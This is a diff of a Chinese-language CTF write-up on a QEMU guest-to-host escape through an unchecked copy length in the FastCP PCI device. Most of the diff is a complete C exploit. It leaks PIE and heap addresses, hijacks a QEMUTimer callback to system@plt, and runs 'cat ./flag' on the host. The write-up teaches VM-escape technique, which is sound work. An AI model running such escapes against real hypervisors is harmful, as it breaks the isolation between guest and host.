@@ -346,6 +346,10 @@ void __fastcall pci_FastCP_realize(PCIDevice_0 *pdev, Error_0 **errp)
 
 可以看到如果size==8 ，根据addr的不同返回不同的数据，
 
+- 功能0x08 返回opaque->cp_state.CP_list_src
+- 功能0x10 返回opaque->cp_state.CP_list_cnt
+- 功能0x18 返回opaque->cp_state.cmd3
+
 其中为了控制size==0需要设置addr为`uint64_t`类型
 
 接下来分析mmio_write
@@ -361,6 +365,25 @@ void __fastcall pci_FastCP_realize(PCIDevice_0 *pdev, Error_0 **errp)
 timer函数根据传入的参数cmd来选择执行的分支
 
 ![](https://pic1.imgdb.cn/item/6358fbce16f2c2beb13db48c.png)
+
+其中`void cpu_physical_memory_rw(hwaddr addr, uint8_t *buf, int len, int is_write)`
+
+````c
+void cpu_physical_memory_rw(hwaddr addr, void *buf,
+                            hwaddr len, bool is_write);
+static inline void cpu_physical_memory_read(hwaddr addr,
+                                            void *buf, hwaddr len)
+{
+    cpu_physical_memory_rw(addr, buf, len, false);
+}
+static inline void cpu_physical_memory_write(hwaddr addr,
+                                             const void *buf, hwaddr len)
+{
+    cpu_physical_memory_rw(addr, (void *)buf, len, true);
+}
+````
+
+如果`opaque->cp_state.CP_list_cnt`大小大于`0x10`，则会根据`cp_state.CP_list_cnt`的大小循环从`opaque->cp_state.CP_list_src`读取结构体到`cp_info`，然后依次将`CP_src`中的数据写入到`CP_buffer`，然后从`CP_buffer`中读取数据到`CP_dst`，长度由`CP_cnt`指定。
 
 漏洞很明显位于在命令为 1 且 CP_list_cnt 大于 0x10 的时候，复制前没有检测 CP_cnt 是否会大于 0x1000 字节，而在 FastCPState 的结构中（结构如下）
 
@@ -380,6 +403,8 @@ timer函数根据传入的参数cmd来选择执行的分支
 ````
 
 可以看出CP_buffer只有0x1000字节。
+
+### 2. 物理地址转换
 
 通过`pagemap`将虚拟机中的虚拟地址转换为物理地址。
 
@@ -503,7 +528,7 @@ int main(){
         exit(-1);
     }
 
-    strcpy(usebuf,"test");
+    strcpy(userbuf,"test");
 
     mlock(userbuf, 0x1000);
     userbuf_pa = va2pa(userbuf);
@@ -513,7 +538,7 @@ int main(){
 }
 ```
 
-### 2. 漏洞利用
+### 3. 漏洞利用
 
 - 通过溢出的读取，泄露 cp_timer 结构体，其中存在 PIE 基址（计算出 system@plt 的地址）和堆地址（整个结构的位置在堆上，计算出结构的开始位置，才能得到我们写入 system 参数的位置）。
 - 通过溢出的写入，覆盖 cp_timer 结构体控制程序执行流
@@ -531,66 +556,104 @@ system 执行内容：
 
 注意：所有在设备中的操作地址都是指 QEMU 模拟的物理地址，但是程序中使用 mmap 申请的是虚拟地址空间。所以要注意使用 mmap 申请出来的超过一页的部分，在物理空间上不连续。如果需要操作那块空间，需要使用那一页的虚拟地址重新计算对应的物理地址。这个性质在这道题中（超过 0x1000 的物理地址复制），需要额外的注意。
 
-### 3. Exploit
+### 4. Exploit
 
 ````c
-#include<stdint.h>
-#include<fcntl.h>
-#include<sys/mman.h>
-#include<sys/io.h>
-#include<stdio.h>
-#include<unistd.h>
+#include <stdint.h>
+#include <fcntl.h>
+#include <sys/mman.h>
+#include <sys/io.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <string.h>
+#include <assert.h>
+
+#define HEX(x) printf("[*]0x%016lx\n", (size_t)x)
+#define LOG(addr) printf("[*]%s\n", addr)
+
+unsigned char* mmio_mem;
+uint64_t phy_userbuf;
+char *userbuf;
+uint64_t phy_userbuf1;
+uint64_t phy_buf0;
+char *userbuf1;
+int fd;
+void Err(char* err){
+    printf("Error: %s\n", err);
+    exit(-1);
+}
+
+void init_mmio(){
+    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
+    if(mmio_fd < 0){
+        Err("Open pci");
+    }
+    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
+    if(mmio_mem<0){
+        Err("mmap mmio_mem");
+    }
+}
+
+void mmio_write(uint64_t addr, uint64_t value){
+    *((uint64_t*)(mmio_mem+addr)) = value;
+}
+
+uint64_t mmio_read(uint64_t addr){
+    return *((uint64_t*)(mmio_mem+addr)); 
+}
+
+void set_list_cnt(uint64_t cnt){
+    mmio_write(0x10, cnt);
+}
+
+void set_src(uint64_t src){
+    mmio_write(0x8, src);
+}
+
+void set_cmd(uint64_t cmd){
+    mmio_write(0x18, cmd);
+}
+
+void set_read(uint64_t cnt){
+    set_src(phy_userbuf);
+    set_list_cnt(cnt);
+
+    set_cmd(0x4);
+    sleep(1);
+}
+
+void set_write(uint64_t cnt){
+    set_src(phy_userbuf);
+    set_list_cnt(cnt);
+
+    set_cmd(0x2);
+    sleep(1);
+}
+
+void set_read_write(uint64_t cnt){
+    set_src(phy_userbuf);
+    set_list_cnt(cnt);
+
+    set_cmd(0x1);
+    sleep(1);
+}
 
 #define PAGE_SHIFT 12
 #define PAGE_SIZE (1 << PAGE_SHIFT)
 #define PFN_PRESENT (1ull << 63)
 #define PFN_PFN ((1ull << 55) - 1)
-
-unsigned char* mmio_mem;
-char* userbuf;
-uint64_t phy_userbuf,phy_userbuf2;
-
-struct FastCP_CP_INFO
+int fd;
+uint32_t page_offset(uint32_t addr)
 {
-    uint64_t CP_src;
-    uint64_t CP_cnt;
-    uint64_t CP_dst;
-};
-
-
-struct QEMUTimer
-{
-    int64_t expire_time;
-    int64_t timer_list;
-    int64_t cb;
-    void * opaque;
-    int64_t next;
-    int attributes;
-    int scale;
-    char shell[0x50];
-};
-
-
-void Err(char * err){
-    printf("Error: %s\n",err);
-    exit(-1);
+    return addr & ((1 << PAGE_SHIFT) - 1);
 }
 
-uint64_t page_offset(uint64_t addr){
-    return addr & ((1 << PAGE_SHIFT) - 1)
-}
-
-uint64_t gva_to_gfn(void* addr)
+uint64_t gva_to_gfn(void *addr)
 {
     uint64_t pme, gfn;
     size_t offset;
-
-    int fd = open("/proc/self/pagemap", O_RDONLY);
-    if (fd < 0)
-    {
-        die("open pagemap");
-    }
     offset = ((uintptr_t)addr >> 9) & ~7;
+    // ((uintptr_t)addr >> 12)<<3
     lseek(fd, offset, SEEK_SET);
     read(fd, &pme, 8);
     if (!(pme & PFN_PRESENT))
@@ -599,122 +662,160 @@ uint64_t gva_to_gfn(void* addr)
     return gfn;
 }
 
-uint64_t gva_to_gpa(void* addr)
+/*
+* transfer visual address to physic address
+*/
+uint64_t gva_to_gpa(void *addr)
 {
     uint64_t gfn = gva_to_gfn(addr);
-    assert(gfn != -1);
     return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
 }
 
-void init_mmio(){
-    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0",O_RDWR|O_SYNC);
-    mmio_mem = mmap(0,0x1000,PROT_READ|PROT_WRITE,MAP_SHARED,mmio_fd,0);
-}
 
-void mmio_write(uint32_t addr,uint32_t value){
-    *(uint32_t*)(mmio_mem+addr) = value;
-}
+size_t va2pa(void *addr){
+    uint64_t data;
 
-uint64_t mmio_read(uint64_t addr){
-    return *(uint64_t*)(mmio_mem+addr); 
-}
+    size_t pagesize = getpagesize();
+    size_t offset = ((uintptr_t)addr / pagesize) * sizeof(uint64_t);
 
-void fastcp_set_list_src(uint64_t list_addr)
-{
-    mmio_write(0x8, list_addr);
-}
-
-void fastcp_set_cnt(uint64_t cnt)
-{
-    mmio_write(0x10, cnt);
-}
-
-void fastcp_do_cmd(uint64_t cmd)
-{
-    mmio_write(0x18, cmd);
-}
-
-void fastcp_do_readfrombuffer(uint64_t addr,uint64_t len){
-    struct FastCP_CP_INFO info;
-    info.CP_cnt = len;
-    info.CP_src = NULL;
-    info.CP_dst = addr;
-    memcpy(userbuf,&info,sizeof(info));
-    fastcp_set_cnt(1);
-    fastcp_set_list_src(phy_userbuf);
-    fastcp_do_cmd(4);
-    sleep(1);
-}
-
-void fastcp_do_writetobuffer(uint64_t addr, uint64_t len)
-{
-    struct FastCP_CP_INFO info;
-    info.CP_cnt = len;
-    info.CP_src = addr;
-    info.CP_dst = NULL;
-    memcpy(userbuf, &info, sizeof(info));
-    fastcp_set_cnt(1);
-    fastcp_set_list_src(phy_userbuf);
-    fastcp_do_cmd(2);
-    sleep(1);
-}
-
-void fastcp_do_movebuffer(uint64_t srcaddr, uint64_t dstaddr, uint64_t len)
-{
-    struct FastCP_CP_INFO info[0x11];
-    for (int i = 0; i < 0x11; i++)
-    {
-        info[i].CP_cnt = len;
-        info[i].CP_src = srcaddr;
-        info[i].CP_dst = dstaddr;
+    if(lseek(fd,offset,SEEK_SET) < 0){
+        puts("lseek");
+        close(fd);
+        return 0;
     }
-    memcpy(userbuf, &info, sizeof(info));
-    fastcp_set_cnt(0x11);
-    fastcp_set_list_src(phy_userbuf);
-    fastcp_do_cmd(1);
-    sleep(1);
+
+    if(read(fd,&data,8) != 8){
+        puts("read");
+        close(fd);
+        return 0;
+    }
+
+    if(!(data & (((uint64_t)1 << 63)))){
+        puts("page");
+        close(fd);
+        return 0;
+    }
+
+    size_t pageframenum = data & ((1ull << 55) - 1);
+    size_t phyaddr = pageframenum * pagesize + (uintptr_t)addr % pagesize;
+
+    close(fd);
+
+    return phyaddr;
 }
 
+void print_hex(uint64_t len, uint64_t offset){
+    printf("===========================\n");
+    for(int i = 0; i<len/8; i++){
+        printf("    0x%lx\n", *(uint64_t*)(userbuf1+offset+i*8));
+    }
+}
+
+size_t buf0, buf1;
+
+void get_pages()
+{
+    size_t buf[0x1000];
+    size_t arry[0x1000];
+    size_t arr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, 0, 0);
+    *(char *)arr = 'a';
+    int n = 0;
+    buf[n] = gva_to_gfn(arr);
+    arry[n++] = arr;
+    for (int i = 1; i < 0x1000; i++)
+    {
+        arr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, 0, 0);
+        *(char *)arr = 'a';
+        size_t fn = gva_to_gfn(arr);
+        for (int j = 0; j < n; j++)
+        {
+            if (buf[j] == fn + 1 || buf[j] + 1 == fn)
+            {
+                LOG("consist pages");
+                HEX(arr);
+                HEX(fn);
+                HEX(arry[j]);
+                HEX(buf[j]);
+                if (fn > buf[j])
+                {
+                    buf0 = arry[j];
+                    buf1 = arr;
+                    phy_buf0 = (buf[j]<<12);
+                }
+                else
+                {
+                    buf1 = arry[j];
+                    buf0 = arr;
+                    phy_buf0 = (fn<<12);
+                }
+                return;
+            }
+        }
+        buf[n] = fn;
+        arry[n++] = arr;
+    }
+}
 
 int main(){
-    printf("[*] init pci and mmio:\n");
+
+    fd = open("/proc/self/pagemap",O_RDONLY);
+    if(!fd){
+        perror("open pagemap");
+        return 0;
+    }
+    get_pages();
+
+    printf("init mmio:\n");
     init_mmio();
-    printf("[*] mmio_mem: %p\n",mmio_mem);
 
-    userbuf = mmap(0,0x2000,PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+    userbuf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+    if (userbuf == MAP_FAILED)
+        Err("mmap userbuf");
+    mlock(userbuf, 0x1000);
+    phy_userbuf = va2pa(userbuf);
+    printf("userbuf va: 0x%llx\n", userbuf);
+    printf("userbuf pa: 0x%llx\n", phy_userbuf);
 
-    mlock(userbuf,0x10000); // 锁定物理内存
+    memset(buf0, 'a', 0x1000);
+    memset(buf1, 'a', 0x1000);
+    printf("[++++] 0x%lx %p\n", buf0, buf0);
+    printf("phy_buf0: 0x%lx\n", phy_buf0);
 
-    phy_userbuf = gva_to_gpa(userbuf);
-    
-    printf("[*] user buff virtual address: %p\n", userbuf);
-    printf("[*] user buff physical address: %p\n", (void*)phy_userbuf);
+    printf("leak addr:\n");
+    *(uint64_t*)(userbuf) = phy_userbuf;
+    *(uint64_t*)(userbuf+0x8) = 0x1000;
+    *(uint64_t*)(userbuf+0x10) = phy_buf0;
+    *(uint64_t*)(userbuf+0xff8) = phy_buf0;
+    set_write(0x1);
+    sleep(1);
+    for(int i=0; i<17; i++){
+        *(uint64_t*)(userbuf+i*0x18) = phy_userbuf;
+        *(uint64_t*)(userbuf+0x8+i*0x18) = 0x1040;
+        *(uint64_t*)(userbuf+0x10+i*0x18) = phy_buf0;
+    }
+    set_read(0x1);
+    //sleep(3);
 
-    fastcp_do_readfrombuffer(phy_userbuf, 0x1030);
-    fastcp_do_writetobuffer(phy_userbuf + 0x1000, 0x30);
-    fastcp_do_readfrombuffer(phy_userbuf, 0x30);
+    size_t buf_addr = *(size_t*)(buf1+0x18)+0xa00;
+    size_t t_addr = *(uint64_t*)(buf1+0x10);
+    printf("timer_addr: 0x%llx 0x%lx\n", buf_addr, t_addr);
+    size_t system_plt = t_addr - 0x4dce80 + 0x2c2180;
+    printf("system_plt: 0x%llx\n", system_plt);
 
-    uint64_t leak_timer = *(uint64_t*)(&userbuf[0x10]);
-    printf("leaking timer: %p\n", (void*)leak_timer);
-    fastcp_set_cnt(1);
-    uint64_t pie_base = leak_timer - 0x4dce80;
-    printf("pie_base: %p\n", (void*)pie_base);
-    uint64_t system_plt = pie_base + 0x2C2180;
-    printf("system_plt: %p\n", (void*)system_plt);
-
-    uint64_t struct_head = *(uint64_t*)(&userbuf[0x18]);
-
-    struct QEMUTimer timer;
-    memset(&timer, 0, sizeof(timer));
-    timer.expire_time = 0xffffffffffffffff;
-    timer.timer_list = *(uint64_t*)(&userbuf[0x8]);
-    timer.cb = system_plt;
-    timer.opaque = struct_head + 0xa00 + 0x1000 + 0x30;
-    strcpy(&timer.shell, "gnome-calculator");
-    memcpy(userbuf + 0x1000, &timer, sizeof(timer));
-    fastcp_do_movebuffer(gva_to_gpa(userbuf + 0x1000) - 0x1000, gva_to_gpa(userbuf + 0x1000) - 0x1000, 0x1000 + sizeof(timer));
-    fastcp_do_cmd(1);
-
+    printf("write ptr:\n");
+    for(int i=0; i<17; i++){
+        *(uint64_t*)(userbuf+i*0x18) = phy_buf0;
+        *(uint64_t*)(userbuf+0x8+i*0x18) = 0x1020;
+        *(uint64_t*)(userbuf+0x10+i*0x18) = phy_buf0;
+    }
+    *(uint64_t*)(buf1+0x10) = system_plt;
+    *(uint64_t*)(buf1+0x18) = buf_addr;
+    char *command="cat ./flag\x00";
+    memcpy(buf0,command,strlen(command));
+    printf("cover system addr\n");
+    set_read_write(0x11);
+    printf("trigger vul\n");
+    set_read(0x1);
     return 0;
 }
 ````
